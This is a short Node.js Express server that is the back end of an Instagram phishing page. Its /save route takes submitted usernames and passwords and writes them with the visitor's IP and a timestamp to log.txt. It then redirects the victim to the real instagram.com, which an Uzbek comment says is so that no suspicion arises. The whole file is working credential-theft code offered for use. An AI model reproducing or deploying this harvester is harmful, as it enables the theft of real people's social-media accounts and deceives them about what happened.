const express = require("express");
const fs = require("fs");
const path = require("path");
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

app.post("/save", (req, res) => {
    const { username, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const vaqt = new Date().toLocaleString("uz-UZ");
    const log = `${vaqt} | IP: ${ip} | ${username} | ${password}\n`;

    fs.appendFileSync("log.txt", log);
    
    // Foydalanuvchini asl Instagramga yuboramiz (shubha uyg‘onmaydi)
    res.redirect("https://www.instagram.com");
});

const port = process.env.PORT || 3000;
app.listen(port, () => console.log("Server ishlayapti"));